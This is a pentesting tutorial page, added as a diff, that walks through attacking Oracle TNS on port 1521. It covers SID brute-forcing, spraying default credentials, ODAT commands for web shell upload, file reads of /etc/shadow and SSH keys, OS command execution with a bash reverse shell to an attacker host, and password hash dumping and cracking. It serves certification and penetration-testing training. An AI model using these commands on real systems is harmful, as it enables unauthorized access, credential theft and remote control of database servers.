@@ -1,0 +1,411 @@
+---
+title: Oracle TNS - Port 1521
+description: Enumeration and attack methodology for Oracle TNS on port 1521, covering listener fingerprinting, SID discovery, default credentials, ODAT modules, file operations, command execution, and database privilege escalation.
+openGraph:
+  title: "Oracle TNS - Port 1521"
+  description: "Enumeration and attack methodology for Oracle TNS on port 1521, covering listener fingerprinting, SID discovery, default credentials, ODAT modules, file operations, command execution, and database privilege escalation."
+  images:
+    - url: /imgs/oracle.jpg
+      width: 1672
+      height: 941
+      alt: Oracle TNS - Port 1521
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "Oracle TNS - Port 1521"
+  description: "Enumeration and attack methodology for Oracle TNS on port 1521, covering listener fingerprinting, SID discovery, default credentials, ODAT modules, file operations, command execution, and database privilege escalation."
+  images:
+    - url: /imgs/oracle.jpg
+      width: 1672
+      height: 941
+      alt: Oracle TNS - Port 1521
+      type: image/jpeg
+---
+
+# Oracle TNS - Port 1521
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nmap -sV -sC -p1521 <IP>
+nmap -p1521 --script oracle-sid-brute <IP> # SID brute force (still useful on 11g and earlier)
+nmap -p1521 --script oracle-tns-version,oracle-enum-users <IP>  # TNS listener info (pre-10g was unauthenticated)
+
+
+odat all -s <IP> -p 1521 # aggresive attack all modules 
+
+odat sidguesser -s <IP> -p 1521 # SID guessing only
+odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file /opt/odat/accounts/accounts.txt # password guessing against a known SID
+odat utlfile -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba --putFile /var/www/html shell.php ./shell.php # file upload via UTL_FILE (classic web shell drop)
+odat externaltable -s <IP> -d <SID> -U <USER> -P <PASS> --getFile /etc passwd
+odat java -s <IP> -d <SID> -U <USER> -P <PASS> --exec "/bin/sh -c id" # ccmd exec via stored java procedures
+odat dbmsscheduler -s <IP> -d <SID> -U <USER> -P <PASS> --exec "cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt" # cmd exec via stored scheduler procedures
+odat privesc -s <IP> -d <SID> -U <USER> -P <PASS> #  priv esc
+odat passwordstealer -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba # password hash dumping (requires SYSDBA)
+
+#sqlplus
+sqlplus <USER>/<PASS>@<IP>:1521/<SID>
+sqlplus <USER>/<PASS>@<IP>:1521/<SID> as sysdba
+
+hydra -L users.txt -P passwords.txt -s 1521 <IP> oracle-listener
+hydra -L users.txt -P passwords.txt -s 1521 <IP> oracle-sid
+
+# some queries to get you started
+SELECT banner FROM v$version;
+SELECT user FROM dual;
+SELECT username FROM all_users;
+SELECT * FROM user_role_privs;
+SELECT * FROM dba_sys_privs WHERE grantee = USER;
+SELECT name, password, spare4 FROM sys.user$;
+```
+
+## Methodology
+
+### Phase 1: Fingerprint and Version Check
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What exact Oracle major version and patchlevel is the TNS listener reporting?
+  - Does the version dictate SID vs service name (11g uses SIDs; 12c+ multitenant uses service names)?
+  - Which hashing scheme is in play (11g DES+SHA1 vs 12c+ PBKDF2) and how crackable will dumped hashes be?
+  - Is this a pre-10g listener that can be manipulated without any credentials?
+</Callout>
+
+```bash
+nmap -sV -sC -p1521 <IP>
+nmap -p1521 --script oracle-tns-version <IP>
+
+# Local exploit lookup
+searchsploit oracle <version>
+searchsploit oracle tns
+```
+
+- [ ] `nmap -sV -sC -p1521 <IP>` identifies the TNS listener and usually returns the exact Oracle version in the banner.
+- [ ] Note the major version, because it dictates which attacks are viable: pre-2007 8i/9i/10g listeners were unauthenticated (`tnscmd10g` can `stop`/`status`/`set log_file` remotely); 11g stores DES + SHA1 hashes in `sys.user$` (crack in seconds, `-m 3100`/`-m 112`); 12c+ introduces pluggable databases (service names) and PBKDF2 hashing in `spare4` (much harder to crack); 18c/19c/21c share the 12c architecture, with 19c the most common production LTS.
+- [ ] `searchsploit oracle <version>` and `searchsploit oracle tns` several pre-auth listener exploits still exist for older versions.
+
+
+### Phase 2: SID / Service Name Enumeration
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What SID(s) or service name(s) does this listener front?
+  - Do the names reveal topology `ORCLCDB`/`ORCLPDB1` (12c+ default) vs `PROD`/`UAT` (multiple logical databases)?
+  - Which enumeration tool is most reliable here ODAT, nmap, or hydra fallback?
+  - Should I plan separate credential attacks per discovered SID?
+</Callout>
+
+```bash
+# Best SID brute-forcer
+odat sidguesser -s <IP> -p 1521
+nmap -p1521 --script oracle-sid-brute <IP>
+hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
+```
+
+- [ ] `odat sidguesser -s <IP> -p 1521` ODAT's SID brute-forcer is the best tool; comprehensive built-in list, clean retries.
+- [ ] `nmap -p1521 --script oracle-sid-brute <IP>` slower second opinion; `hydra ... oracle-sid` as a fallback when ODAT isn't available.
+- [ ] Manually test the usual suspects: `XE`, `ORCL`, `ORCLCDB`, `ORCLPDB1`, `PROD`, `PRD`, `DEV`, `DEVEL`, `TEST`, `UAT`, `DB`, `SALES`, `HR`, `FINANCE`. On 12c+ always try the default container `ORCLCDB` and pluggable DB `ORCLPDB1`.
+- [ ] Treat the result as topology intel `PROD` and `UAT` side-by-side means multiple independent databases, each its own target. Plan credential attempts per-SID.
+
+### Phase 3: Default and Brute-Forced Credentials
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which Oracle-specific default pairs (`scott:tiger`, `system:manager`, `dbsnmp:dbsnmp`) are likely still present?
+  - Which credentials harvested elsewhere should be sprayed (DBAs reuse heavily because Oracle rotation is painful)?
+  - What lockout (`PASSWORD_LOCK_TIME`) and audit (`dba_audit_trail`/`unified_audit_trail`) controls apply?
+  - Have defaults and reuse been exhausted before a noisy full-dictionary run?
+</Callout>
+
+```bash
+odat passwordguesser -s <IP> -p 1521 -d <SID>
+sqlplus scott/tiger@<IP>:1521/<SID>
+```
+
+- [ ] `odat passwordguesser -s <IP> -p 1521 -d <SID>` runs ODAT's Oracle-specific default-pair list (hundreds of entries) against the SID. Fastest path to credentials.
+- [ ] Manually test classics still found on production because rotating them breaks hard-coded legacy apps: `scott:tiger`, `sys:oracle`, `sys:change_on_install`, `system:oracle`, `system:manager`, `dbsnmp:dbsnmp`, `ctxsys:ctxsys`, `mdsys:mdsys`, `xdb:xdb`.
+- [ ] `sqlplus scott/tiger@<IP>:1521/<SID>` onfirm each hit manually and move to Phase 4.
+- [ ] Spray every credential harvested elsewhere password reuse is extremely common on Oracle. Avoid `SYS`/`SYSTEM` in the first pass: they are watched most and lock out fastest under `PASSWORD_LOCK_TIME`.
+
+### Phase 4: Post-Access Enumeration
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Who am I (`SELECT user FROM dual`) and what roles/privileges do I hold?
+  - Do I have `DBA`, `CREATE ANY PROCEDURE`, `EXECUTE ANY PROCEDURE`, or anything escalation-worthy?
+  - Which non-system schemas hold application data, credentials, or PII?
+  - Am I already SYSDBA-capable, letting me skip straight to hash extraction and file ops?
+</Callout>
+
+```sql
+-- Identity and version
+SELECT banner FROM v$version;
+SELECT user FROM dual;
+
+-- Users and privileges
+SELECT username FROM all_users ORDER BY created;
+SELECT * FROM user_role_privs;
+SELECT * FROM dba_sys_privs WHERE grantee = USER;
+
+-- Application data and credential columns
+SELECT table_name FROM all_tables WHERE owner NOT IN
+  ('SYS','SYSTEM','MDSYS','CTXSYS','XDB','WMSYS','OUTLN','DBSNMP','ORDSYS','APEX_030200');
+SELECT column_name, table_name FROM all_tab_columns
+  WHERE lower(column_name) LIKE '%pass%' OR lower(column_name) LIKE '%secret%' OR lower(column_name) LIKE '%key%';
+```
+
+- [ ] `SELECT banner FROM v$version;` and `SELECT user FROM dual;`  exact version/patchlevel and the account you're connected as.
+- [ ] `SELECT username FROM all_users ORDER BY created;` `created` flags post-install accounts, which are likelier to hold application secrets.
+- [ ] `SELECT * FROM user_role_privs;` and `SELECT * FROM dba_sys_privs WHERE grantee = USER;` look for `DBA`, `RESOURCE`, and high-value system privs (`CREATE ANY PROCEDURE`, `EXECUTE ANY PROCEDURE`, `ALTER SYSTEM`) that enable Phase 5.
+- [ ] Strip built-in schemas with the `all_tables` filter, then hunt credential columns with the `all_tab_columns` query. Read interesting tables with `SELECT * FROM <schema>.<table> FETCH FIRST 20 ROWS ONLY;` (12c+) or `... WHERE ROWNUM <= 20;` (11g).
+
+
+### Phase 5: Privilege Escalation to SYSDBA
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Can my current account connect `as sysdba` directly?
+  - Do I hold privileges (`CREATE ANY PROCEDURE`, `BECOME USER`) that bridge to SYSDBA?
+  - Does ODAT's automated privesc hit a known package abuse (DBMS_XMLQUERY, CTXSYS.DRILOAD)?
+  - Is the patchlevel old enough to carry a quarterly-CPU privesc CVE?
+</Callout>
+
+```bash
+# Try SYSDBA directly with current creds
+sqlplus <USER>/<PASS>@<IP>:1521/<SID> as sysdba
+
+# Automated privesc paths
+odat privesc -s <IP> -p 1521 -d <SID> -U <USER> -P <PASS>
+```
+
+```sql
+-- Check for escalation-worthy privileges
+SELECT * FROM dba_sys_privs WHERE grantee = USER;
+```
+
+- [ ] `sqlplus <USER>/<PASS>@<IP>:1521/<SID> as sysdba` if the account has SYSDBA, this succeeds immediately and you skip the rest of the phase.
+- [ ] `SELECT * FROM dba_sys_privs WHERE grantee = USER;` onfirm whether you already hold escalation primitives like `CREATE ANY PROCEDURE` or `BECOME USER`.
+- [ ] `odat privesc -s <IP> -p 1521 -d <SID> -U <USER> -P <PASS>` ODAT tries several known paths automatically (DBMS_XMLQUERY, CTXSYS.DRILOAD, DBMS_METADATA abuse).
+- [ ] Check for CVEs against the exact patchlevel from Phase 1 unpatched DBs accumulate privesc bugs from Oracle's quarterly Critical Patch Updates.
+
+<Callout type="info">
+SYSDBA is not a role; it is a special authentication mode that bypasses the authorization layer entirely. Connecting `as sysdba` maps you to the `SYS` schema with full filesystem-level authority which is why it lets you read `sys.user$` (normally restricted), use `UTL_FILE` without directory grants, and drop Java classes into the database. Treat SYSDBA as root on the database server.
+</Callout>
+
+### Phase 6: Hash Extraction (Requires SYSDBA)
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which hash columns exist for this version (`password` DES on 11g vs `spare4` PBKDF2/SHA-512 on 12c+)?
+  - Which hashcat mode matches each format, and is cracking realistic on this version?
+  - Which cracked passwords are worth spraying against the OS and other services?
+  - Should I capture both `password` and `spare4` for cross-cracking older accounts?
+</Callout>
+
+```sql
+-- Dump all hash material (SYSDBA)
+SELECT name, password, spare4 FROM sys.user$;
+```
+
+```bash
+# 11g DES
+hashcat -m 3100 hashes_11g_des.txt /usr/share/wordlists/rockyou.txt
+
+# 11g SHA-1 (salted)
+hashcat -m 112 hashes_11g_sha1.txt /usr/share/wordlists/rockyou.txt
+
+# 12c+ SHA-512 + PBKDF2 
+hashcat -m 12300 hashes_12c.txt ./targeted.txt --rules-file best64.rule
+```
+
+- [ ] `SELECT name, password, spare4 FROM sys.user$;` `password` is the legacy 11g-and-earlier DES hash (crack in seconds, `-m 3100`); `spare4` holds modern hashes `S:` salted SHA-1 on 11g (`-m 112`), `H:`/`T:` PBKDF2 and SHA-512 on 12c+ (`-m 12300`+). Or use `odat passwordstealer ... --sysdba`.
+- [ ] Save both columns older accounts may only be crackable via the legacy `password` value.
+- [ ] Crack offline with the matching mode (see phase cheatsheet). 12c+ PBKDF2 is slow; prefer a targeted wordlist + rules over rockyou.
+- [ ] Spray every cracked password against SSH, SMB, WinRM, RDP, and domain auth Oracle DBAs routinely reuse DB passwords on their OS accounts.
+
+### Phase 7: File Operations and RCE
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which primitive fits the target `UTL_FILE` write, external-table read, `DBMS_JAVA`, or `DBMS_SCHEDULER`?
+  - Does a co-located web server share a directory the `oracle` OS user can write to?
+  - Is Java enabled (most reliable RCE) or do I fall back to `DBMS_SCHEDULER`?
+  - Where will scheduler output land, since it isn't returned over the connection?
+</Callout>
+
+```bash
+# File upload via UTL_FILE (web shell drop) test with a text file first
+odat utlfile -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba --putFile /var/www/html shell.php ./shell.php
+
+# Arbitrary file read via external tables
+odat externaltable -s <IP> -d <SID> -U <USER> -P <PASS> --getFile /etc passwd
+
+# OS command execution via Java stored procedures (most reliable)
+odat java -s <IP> -d <SID> -U <USER> -P <PASS> --exec "/bin/sh -c 'id; uname -a'"
+
+# OS command execution via DBMS_SCHEDULER (fallback when Java disabled)
+odat dbmsscheduler -s <IP> -d <SID> -U <USER> -P <PASS> --exec "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt"
+```
+
+- [ ] **File upload via `UTL_FILE`** drops a file into any path the `oracle` OS user can write to. Test with an innocuous text file first to confirm the path before dropping a shell. Note: `UTL_FILE` still obeys Unix permissions it writes as `oracle`, not root.
+- [ ] **File read via external tables** reads anything `oracle` can read. Prime targets: `/etc/passwd`, `/etc/shadow` (if oracle is in the shadow group), `/home/oracle/.ssh/id_rsa`, `/home/oracle/.bash_history`, `/opt/oracle/admin/<SID>/pfile/init.ora`.
+- [ ] **Command execution via Java** the most reliable modern RCE: uploads a tiny class wrapping `Runtime.exec()` and returns output over the existing DB connection. Fire a reverse shell directly: `odat java --exec '/bin/sh -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'`.
+- [ ] **Command execution via `DBMS_SCHEDULER`**fallback when Java is disabled. Output is not returned, so read it back via `externaltable` or a dropped web shell. Chain primitives: drop a reverse-shell script with `utlfile`, then trigger it with `dbmsscheduler` or `java`.
+
+
+<Quiz
+  question="You have SYSDBA on an Oracle 19c instance on Linux. The server also hosts Tomcat, but /opt/tomcat/webapps/ is owned by tomcat:tomcat and the oracle user is not in that group. What is the fastest path to a reverse shell?"
+  options={[
+    "Drop a JSP web shell into /opt/tomcat/webapps/ROOT/ via odat utlfile UTL_FILE runs as oracle, which bypasses Unix permissions",
+    "Use odat externaltable to read /etc/shadow, crack tomcat's password offline, and SSH in as tomcat",
+    "Use odat java --exec to run a Bash reverse-shell one-liner directly no filesystem write required",
+    "Use odat dbmsscheduler to schedule a job that calls the oracle user's crontab and gets code execution next minute"
+  ]}
+  answer={2}
+  explanation="UTL_FILE (A) still obeys Unix permissions it writes as oracle and cannot write to a tomcat:tomcat-owned directory, so the write fails. Cracking shadow (B) is slow and unreliable; Tomcat's service account usually has a random password not in rockyou. Waiting for cron (D) is pointless when immediate execution is available. The Java stored procedure (C) is correct: odat java --exec runs commands directly as oracle with no filesystem write, returns output over the existing connection, and fires a reverse shell in one call. Handle privilege escalation from the oracle shell separately."
+/>
+
+## Overview
+
+Oracle Database uses the TNS (Transparent Network Substrate) protocol for client-server communication. It is the dominant enterprise RDBMS heavily present in government, finance, telco, and healthcare — and routinely found unpatched on internal networks because upgrades are expensive and risky.
+
+| Detail | Value |
+|--------|-------|
+| Port | 1521/TCP (TNS Listener, default also 1522, 1526, 1830) |
+| Client config | `tnsnames.ora` (`$ORACLE_HOME/network/admin/`) |
+| Server config | `listener.ora` (`$ORACLE_HOME/network/admin/`) |
+| Listener log (Linux) | `$ORACLE_BASE/diag/tnslsnr/<host>/listener/trace/listener.log` |
+| Audit trail (11g) | `SYS.DBA_AUDIT_TRAIL` |
+| Audit trail (12c+) | `UNIFIED_AUDIT_TRAIL` |
+| Identifier | SID (11g and earlier) or service name (12c+ multitenant) |
+
+<Callout type="info">
+Oracle requires tooling not included in standard Kali installs. Install **Oracle Instant Client** (for `sqlplus`) and **ODAT** (for automated exploitation) before the exam both are finicky to set up and you do not want to troubleshoot library paths on exam day. See Environment Setup below.
+</Callout>
+
+## Quick Reference
+
+| Task | Command |
+|------|---------|
+| Nmap scan | `nmap -sV -sC -p1521 <IP>` |
+| SID brute force | `odat sidguesser -s <IP> -p 1521` |
+| Full auto-exploit | `odat all -s <IP> -p 1521` |
+| SQL*Plus login | `sqlplus <USER>/<PASS>@<IP>:1521/<SID>` |
+| SQL*Plus SYSDBA login | `sqlplus <USER>/<PASS>@<IP>:1521/<SID> as sysdba` |
+| List users | `SELECT username FROM all_users;` |
+| List non-system tables | `SELECT table_name FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM','MDSYS','CTXSYS','XDB','WMSYS','OUTLN','DBSNMP');` |
+| Check privileges | `SELECT * FROM dba_sys_privs WHERE grantee = USER;` |
+| Dump hashes (SYSDBA) | `SELECT name, password, spare4 FROM sys.user$;` |
+| Upload file | `odat utlfile -s <IP> -d <SID> -U <USER> -P <PASS> --sysdba --putFile <PATH> <FILE> <LOCAL>` |
+| Read file | `odat externaltable -s <IP> -d <SID> -U <USER> -P <PASS> --getFile <PATH> <FILE>` |
+| Execute command (Java) | `odat java -s <IP> -d <SID> -U <USER> -P <PASS> --exec "<CMD>"` |
+| Execute command (scheduler) | `odat dbmsscheduler -s <IP> -d <SID> -U <USER> -P <PASS> --exec "<CMD>"` |
+
+## Environment Setup
+
+### Oracle Instant Client (sqlplus)
+
+```bash
+# Download basic + sqlplus packages from Oracle (free account required)
+# https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html
+
+sudo mkdir -p /opt/oracle
+cd /opt/oracle
+sudo unzip instantclient-basic-linux.x64-*.zip
+sudo unzip instantclient-sqlplus-linux.x64-*.zip
+
+# Environment (append to ~/.bashrc or ~/.zshrc)
+export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_12:$LD_LIBRARY_PATH
+export PATH=/opt/oracle/instantclient_21_12:$PATH
+source ~/.bashrc
+
+# System-wide library registration (fixes libsqlplus.so errors)
+sudo sh -c "echo /opt/oracle/instantclient_21_12 > /etc/ld.so.conf.d/oracle-instantclient.conf"
+sudo ldconfig
+```
+
+### ODAT
+
+```bash
+# Clone from source (the pip package lags well behind master)
+git clone https://github.com/quentinhardy/odat.git /opt/odat
+cd /opt/odat
+pip3 install -r requirements.txt
+
+# Symlink for convenience
+sudo ln -s /opt/odat/odat.py /usr/local/bin/odat
+sudo chmod +x /usr/local/bin/odat
+
+# Verify
+odat --version
+```
+
+<Callout type="info">
+ODAT depends on `cx_Oracle` (or `oracledb` on newer versions), which needs the Instant Client libraries reachable via `LD_LIBRARY_PATH`. If `odat` crashes with `DPI-1047` or `libclntsh.so` errors, it's your Instant Client environment, not ODAT. Fix it once and save the setup in a script reinstalling on exam day will cost you a flag.
+</Callout>
+
+## ODAT Module Reference
+
+| Module | What it actually exploits |
+|--------|---------------------------|
+| `all` | Runs every module in sequence noisy but comprehensive |
+| `sidguesser` | Brute-forces SID / service name via TNS negotiation |
+| `passwordguesser` | Dictionary attack against a given SID |
+| `tnscmd` | Sends raw TNS commands (pre-10g listener hijack) |
+| `utlfile` | File upload/read via the `UTL_FILE` PL/SQL package |
+| `externaltable` | File read via `CREATE DIRECTORY` + external table definition |
+| `java` | OS command execution via `DBMS_JAVA` stored procedures |
+| `dbmsscheduler` | OS command execution via `DBMS_SCHEDULER` jobs |
+| `ctxsys` | Exploits `CTX_SYS.DRILOAD` legacy privilege escalation |
+| `privesc` | Runs multiple known privilege escalation primitives |
+| `passwordstealer` | Dumps `sys.user$` hashes (requires SYSDBA) |
+| `oradbg` | DBA-level process manipulation via `oradebug` |
+
+## Default Credentials
+
+| Username | Password | Notes |
+|----------|----------|-------|
+| `scott` | `tiger` | Classic example account still found on production and training systems |
+| `sys` | `change_on_install` | Default install SYSDBA password (older installers) |
+| `sys` | `oracle` | Default SYSDBA on many installs |
+| `sys` | `manager` | Default SYSDBA variant |
+| `system` | `oracle` | Default DBA |
+| `system` | `manager` | Default DBA variant |
+| `dbsnmp` | `dbsnmp` | SNMP monitoring account frequently forgotten |
+| `ctxsys` | `ctxsys` | Oracle Text context services |
+| `mdsys` | `mdsys` | Metadata services |
+| `xdb` | `xdb` | XML database schema |
+| `hr` | `hr` | Sample HR schema (often left enabled in test DBs) |
+| `outln` | `outln` | Query optimizer support |
+| `apex_public_user` | `apex` | Oracle APEX default |
+
+<Callout type="default">
+`scott:tiger` dates back to the first version of Oracle in 1979 and is still found on production systems because sample schemas ship enabled by default and application teams forget to disable them. Always try it costs nothing, wins flags.
+</Callout>
+
+## Dangerous Settings
+
+| Setting / Condition | Risk |
+|---------------------|------|
+| Default passwords not rotated | Full DB access via known credentials |
+| TNS listener pre-10g without password | `tnscmd10g` can stop the listener, change logs, hijack traffic |
+| `UTL_FILE_DIR` set to `*` or broad paths | Arbitrary file read/write via `UTL_FILE` |
+| Java enabled in the database | OS command execution via `DBMS_JAVA` |
+| `CREATE ANY DIRECTORY` granted | External tables can read any file the `oracle` user can read |
+| Unrestricted `DBMS_SCHEDULER` grants | OS command execution via scheduled jobs |
+| `REMOTE_OS_AUTHENT=TRUE` | Client-supplied OS user is trusted authentication bypass |
+| Listener without password (legacy) | Remote listener manipulation, log injection |
+| Unpatched PSU/CPU level | Accumulated privesc and RCE CVEs from quarterly updates |
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #oracle #tns #penetrationtesting #redteam #certification #linux #windows #service-enum #recon
+</div>
